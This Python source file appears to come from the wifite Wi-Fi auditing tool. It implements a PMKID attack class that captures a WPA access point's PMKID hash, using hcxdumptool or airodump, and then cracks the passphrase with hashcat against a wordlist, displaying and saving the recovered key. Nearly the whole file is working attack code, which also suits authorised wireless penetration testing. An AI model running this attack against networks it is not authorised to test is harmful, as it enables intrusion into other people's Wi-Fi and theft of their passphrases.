#!/usr/bin/env python
# -*- coding: utf-8 -*-


from threading import Thread
import os
import time
import re
from shutil import copy
from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapngTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID
from ..tools.airodump import Airodump



class AttackPMKID(Attack):
    def __init__(self, target):
        super().__init__(target)
        self.crack_result = None
        self.do_airCRACK = False
        self.keep_capturing = None
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.success = False
        self.timer = None

    @staticmethod
    def get_existing_pmkid_file(bssid):
        """
        Load PMKID Hash from a previously-captured hash in ./hs/
        Returns:
            The hashcat hash (hash*bssid*station*essid) if found.
            None if not found.
        """
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')

        file_re = re.compile(r'.*pmkid_.*\.22000')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue

            with open(pmkid_filename, 'r') as pmkid_handle:
                pmkid_hash = pmkid_handle.read().strip()
                if pmkid_hash.count('*') < 3:
                    continue
                existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                if existing_bssid == bssid:
                    return pmkid_filename
        return None

    def run_hashcat(self):
        """
        Performs PMKID attack, if possible.
            1) Captures PMKID hash (or re-uses existing hash if found).
            2) Cracks the hash.

        Returns:
            True if handshake is captured. False otherwise.
        """

        # Skip if user doesn't want to run PMKID attack
        if Configuration.dont_use_pmkid:
            self.success = False
            return False

        from ..util.process import Process
        # Check that we have all hashcat programs
        dependencies = [
            HcxDumpTool.dependency_name,
            HcxPcapngTool.dependency_name
        ]
        if missing_deps := [dep for dep in dependencies if not Process.exists(dep)]:
            Color.pl(
                f'{{!}} Skipping PMKID attack, missing required tools: {{O}}{", ".join(missing_deps)}{{W}}')
            return False

        pmkid_file = None

        if not Configuration.ignore_old_handshakes:
            # Load exisitng PMKID hash from filesystem
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              f'Loaded {{C}}existing{{W}} PMKID hash: {{C}}{pmkid_file}{{W}}\n')

        if pmkid_file is None:
            # Capture hash from live target.
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False  # No hash found.

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            return self._extracted_from_run_hashcat_44(
                '{+} Not cracking pmkid because {C}skip-crack{W} was used{W}'
            )
        # Crack it.
        if Process.exists(Hashcat.dependency_name):
            try:
                self.success = self.crack_pmkid_file(pmkid_file)
            except KeyboardInterrupt:
                return self._extracted_from_run_hashcat_44(
                    '\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}'
                )
        else:
            self.success = False
            Color.pl(
                f'\n {{O}}[{{R}}!{{O}}] Note: PMKID attacks are not possible because you do not have {{C}}{Hashcat.dependency_name}{{O}}.{{W}}')

        return True  # Even if we don't crack it, capturing a PMKID is 'successful'

    # TODO Rename this here and in `run_hashcat`
    def _extracted_from_run_hashcat_44(self, arg0):
        Color.pl(arg0)
        self.success = False
        return True

    def run(self):
        if self.do_airCRACK:
            self.run_aircrack()
        else:
            self.run_hashcat()

    def run_aircrack(self):
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'PMKID capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            # # Try to load existing handshake
            # if Configuration.ignore_old_handshakes == False:
            #     bssid = airodump_target.bssid
            #     essid = airodump_target.essid if airodump_target.essid_known else None
            #     handshake = self.load_handshake(bssid=bssid, essid=essid)
            #     if handshake:
            #         Color.pattack('WPA', self.target, 'Handshake capture',
            #                       'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
            #         Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
            #         return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)

            while not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              f'Listening. (clients:{{G}}{{W}}, +'
                              f'deauth:{{O}}{{W}}, timeout:{{R}}{timeout_timer}{{W}})')

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                # bssid = airodump_target.bssid
                # essid = airodump_target.essid if airodump_target.essid_known else None

                # AttackPMKID.check_pmkid(temp_file, self.target.bssid)
                if self.check_pmkid(temp_file):
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA', airodump_target, 'PMKID capture', '{G}Captured PMKID{W}')
                    Color.pl('')
                    capture = temp_file
                    break

                # There is no handshake
                capture = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # # Look for new clients
                # airodump_target = self.wait_for_target(airodump)
                # for client in airodump_target.clients:
                #     if client.station not in self.clients:
                #         Color.clear_entire_line()
                #         Color.pattack('WPA',
                #                 airodump_target,
                #                 'Handshake capture',
                #                 'Discovered new client: {G}%s{W}' % client.station)
                #         Color.pl('')
                #         self.clients.append(client.station)

                # # Send deauth to a client or broadcast
                # if deauth_timer.ended():
                #     self.deauth(airodump_target)
                #     # Restart timer
                #     deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())
                # continue # Handshake listen+deauth loop

        if capture is None:
            # No handshake, attack failed.
            Color.pl(
                f'\n{{!}} {{O}}WPA handshake capture {{R}}FAILED:{{O}} Timed out after {Configuration.wpa_attack_timeout:d} seconds')
            self.success = False
        else:
            # Save copy of handshake to ./hs/
            self.success = False
            self.save_pmkid(capture)

        return self.success

    def check_pmkid(self, filename):
        """Returns tuple (BSSID,None) if aircrack
        thinks self.capfile contains a handshake / can be cracked"""

        from ..util.process import Process

        command = f'aircrack-ng  "{filename}"'
        (stdout, stderr) = Process.call(command)
        return any(
            'with PMKID' in line and self.target.bssid in line for line in stdout.split("\n"))

    def capture_pmkid(self):
        """
        Runs hashcat's hcxpcapngtool to extract PMKID hash from the .pcapng file.
        Returns:
            The PMKID hash (str) if found, otherwise None.
        """
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # Start hcxdumptool
        t = Thread(target=self.dumptool_thread)
        t.start()

        # Repeatedly run pcaptool & check output for hash for self.target.essid
        pmkid_hash = None
        pcaptool = HcxPcapngTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break  # Got PMKID

            Color.pattack(
                'PMKID', self.target, 'CAPTURE', f'Waiting for PMKID ({{C}}{str(self.timer)}{{W}})')
            time.sleep(1)

        self.keep_capturing = False

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE', '{R}Failed{O} to capture PMKID\n')
            Color.pl('')
            return None  # No hash found.

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        return self.save_pmkid(pmkid_hash)

    def crack_pmkid_file(self, pmkid_file):
        """
        Runs hashcat containing PMKID hash (*.22000).
        If cracked, saves results in self.crack_result
        Returns:
            True if cracked, False otherwise.
        """

        # Check that wordlist exists before cracking.
        if Configuration.wordlist is None:
            Color.pl(
                '\n{!} {O}Not cracking PMKID because there is no {R}wordlist{O} (re-run with {C}--dict{O})')

            # TODO: Uncomment once --crack is updated to support recracking PMKIDs.
            # Color.pl(
            # '{!} {O}Run wifite with the {R}--crack{O} and {R}--dict{O} options to try again.')

            key = None
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK',
                          f'Cracking PMKID using {{C}}{Configuration.wordlist}{{W}} ...\n')
            key = Hashcat.crack_pmkid(pmkid_file)

        if key is not None:
            return self._extracted_from_crack_pmkid_file_31(key, pmkid_file)
        # Failed to crack.
        if Configuration.wordlist is not None:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, '{R}CRACK',
                          '{R}Failed {O}Passphrase not found in dictionary.\n')
        return False

    # TODO Rename this here and in `crack_pmkid_file`
    def _extracted_from_crack_pmkid_file_31(self, key, pmkid_file):
        # Successfully cracked.
        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACKED', f'{{C}}Key: {{G}}{key}{{W}}')
        self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                                             pmkid_file, key)
        Color.pl('\n')
        self.crack_result.dump()
        return True

    def dumptool_thread(self):
        """Runs hashcat's hcxdumptool until it dies or `keep_capturing == False`"""
        dumptool = HcxDumpTool(self.target, self.pcapng_file)

        # Let the dump tool run until we have the hash.
        while self.keep_capturing and dumptool.poll() is None:
            time.sleep(0.5)

        dumptool.interrupt()

    def save_pmkid(self, pmkid_hash):
        """Saves a copy of the pmkid (handshake) to hs/ directory."""
        # Create handshake dir
        if self.do_airCRACK:
            return self._extracted_from_save_pmkid_6(pmkid_hash)
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        pmkid_file = self._extracted_from_save_pmkid_21('.22000')
        with open(pmkid_file, 'w') as pmkid_handle:
            pmkid_handle.write(pmkid_hash)
            pmkid_handle.write('\n')

        return pmkid_file

    # TODO Rename this here and in `save_pmkid`
    def _extracted_from_save_pmkid_21(self, arg0):
        # Generate filesystem-safe filename from bssid, essid and date
        # essid_safe = re.sub(f'[^a-zA-Z\d]', '', self.target.essid)
        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        result = f'pmkid_{essid_safe}_{bssid_safe}_{date}{arg0}'
        result = os.path.join(Configuration.wpa_handshake_dir, result)

        Color.p(f'\n{{+}} Saving copy of {{C}}PMKID Hash{{W}} to {{C}}{result}{{W}} ')
        return result

    # TODO Rename this here and in `save_pmkid`
    def _extracted_from_save_pmkid_6(self, pmkid_hash):
        pmkid_file = self._extracted_from_save_pmkid_21('.cap')
        copy(pmkid_hash, pmkid_file)
        return pmkid_file
